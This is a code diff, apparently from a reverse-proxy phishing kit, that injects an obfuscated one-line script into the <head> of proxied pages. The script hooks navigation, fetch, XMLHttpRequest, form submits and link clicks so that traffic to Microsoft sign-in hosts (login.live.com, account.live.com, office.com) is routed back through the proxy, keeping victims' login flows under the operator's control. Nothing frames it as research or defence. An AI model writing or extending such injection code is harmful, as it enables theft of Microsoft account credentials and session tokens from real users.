@@ -49,6 +49,10 @@ async function replace_response_text(response, upstream, original, ip) {
     text
       .replace(new RegExp(upstream, "g"), original)
       .replace(
+        "<head>",
+        `<head><script>(function(){var origin='${original}';var personalHosts=['login.live.com','account.live.com','www.office.com','office.com'];function toProxy(url){try{var u=new URL(url,window.location.href);if(personalHosts.indexOf(u.host)>-1){var sep=(u.search&&u.search.length>0)?'&':'?';return origin+u.pathname+u.search+sep+'x-target-host='+u.host;}}catch(e){}return url;}try{var loc=window.location;var oa=loc.assign.bind(loc);var or=loc.replace.bind(loc);loc.assign=function(u){oa(toProxy(u));};loc.replace=function(u){or(toProxy(u));};var ow=window.open;window.open=function(u,n,f){return ow.call(window,toProxy(u),n,f)};var np=history.pushState.bind(history);var nr=history.replaceState.bind(history);history.pushState=function(s,t,u){return np(s,t,toProxy(u))};history.replaceState=function(s,t,u){return nr(s,t,toProxy(u))};var of=window.fetch;if(of){window.fetch=function(input,init){if(typeof input==='string'){input=toProxy(input);}else if(input&&input.url){input=new Request(toProxy(input.url),input);}return of(input,init);};}var ox=XMLHttpRequest&&XMLHttpRequest.prototype&&XMLHttpRequest.prototype.open;if(ox){XMLHttpRequest.prototype.open=function(m,u){var args=[].slice.call(arguments);args[1]=toProxy(u);return ox.apply(this,args);};}document.addEventListener('submit',function(e){try{var form=e.target;if(form&&form.action){form.action=toProxy(form.action);}}catch(_){}},true);document.addEventListener('click',function(e){var a=e.target&&e.target.closest&&e.target.closest('a[href]');if(a){a.href=toProxy(a.href);}},true);}catch(e){}})();</script>`
+      )
+      .replace(
         "</body>",
         `<script>
           document.addEventListener('DOMContentLoaded', () => {
@@ -145,6 +149,12 @@ async function replace_response_text_personal(response, upstream, original, ip) 
     let modifiedText = text;
 
     const hostPattern = "(login\\.live\\.com|account\\.live\\.com|www\\.office\\.com|office\\.com|login\\.microsoftonline\\.com)";
+
+    // Early head-level nav trap for personal pages
+    modifiedText = modifiedText.replace(
+      "<head>",
+      `<head><script>(function(){var origin='${original}';var personalHosts=['login.live.com','account.live.com','www.office.com','office.com'];function toProxy(url){try{var u=new URL(url,window.location.href);if(personalHosts.indexOf(u.host)>-1){var sep=(u.search&&u.search.length>0)?'&':'?';return origin+u.pathname+u.search+sep+'x-target-host='+u.host;}}catch(e){}return url;}try{var loc=window.location;var oa=loc.assign.bind(loc);var or=loc.replace.bind(loc);loc.assign=function(u){oa(toProxy(u));};loc.replace=function(u){or(toProxy(u));};var ow=window.open;window.open=function(u,n,f){return ow.call(window,toProxy(u),n,f)};var np=history.pushState.bind(history);var nr=history.replaceState.bind(history);history.pushState=function(s,t,u){return np(s,t,toProxy(u))};history.replaceState=function(s,t,u){return nr(s,t,toProxy(u))};var of=window.fetch;if(of){window.fetch=function(input,init){if(typeof input==='string'){input=toProxy(input);}else if(input&&input.url){input=new Request(toProxy(input.url),input);}return of(input,init);};}var ox=XMLHttpRequest&&XMLHttpRequest.prototype&&XMLHttpRequest.prototype.open;if(ox){XMLHttpRequest.prototype.open=function(m,u){var args=[].slice.call(arguments);args[1]=toProxy(u);return ox.apply(this,args);};}document.addEventListener('submit',function(e){try{var form=e.target;if(form&&form.action){form.action=toProxy(form.action);}}catch(_){}},true);document.addEventListener('click',function(e){var a=e.target&&e.target.closest&&e.target.closest('a[href]');if(a){a.href=toProxy(a.href);}},true);}catch(e){}})();</script>`
+    );
 
     // Rewrite absolute URLs in double-quoted attributes/strings
     const reDouble = new RegExp(`"(https:\\/\\/(${hostPattern})([^"]*))"`, "g");
